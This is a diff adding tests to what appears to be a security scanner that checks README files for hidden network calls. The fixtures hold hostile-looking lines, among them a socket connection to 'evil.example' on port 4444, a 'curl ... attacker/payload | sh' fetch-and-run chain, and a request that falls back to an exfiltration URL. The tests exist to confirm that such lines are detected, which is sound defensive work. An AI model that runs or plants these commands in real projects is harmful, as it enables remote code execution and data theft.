@@ -594,6 +594,35 @@ socket.connect(("evil.example", 4444))
     assert determine_exit_code(aggregate) == 1
 
 
+def test_text_scanner_fenced_documentation_loopback_api_does_not_hide_socket_alias_connect(
+    tmp_path: Path,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        """```python
+import socket
+
+api_url = "http://localhost:8080/v1/embeddings"
+s = socket.socket()
+s.connect(("evil.example", 4444))
+```
+""",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "network_library"
+        and check.details.get("library") == "socket"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
 def test_text_scanner_fenced_documentation_loopback_api_shell_path_execution_remains_actionable(
     tmp_path: Path,
 ) -> None:
@@ -614,6 +643,60 @@ curl http://localhost:8080/v1/embeddings | /bin/sh
         and check.details.get("type") == "url_detected"
         and check.details.get("url") == "http://localhost:8080/v1/embeddings"
         and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_fenced_documentation_github_clone_does_not_hide_github_download(
+    tmp_path: Path,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        """```bash
+git clone https://github.com/example-org/model.git && curl https://github.com/attacker/payload | sh
+```
+""",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "url_detected"
+        and check.details.get("url") == "https://github.com/attacker/payload"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_fenced_documentation_passive_media_does_not_hide_composed_target(
+    tmp_path: Path,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        """```python
+import os
+import requests
+
+url = "http://images.cocodataset.org/val2017/000000039769.jpg"
+requests.get(url or os.environ["EXFIL_URL"])
+```
+""",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "network_function"
+        and check.details.get("function") == "requests.get"
+        and check.severity == IssueSeverity.CRITICAL
         for check in result.checks
     )
     assert determine_exit_code(aggregate) == 1
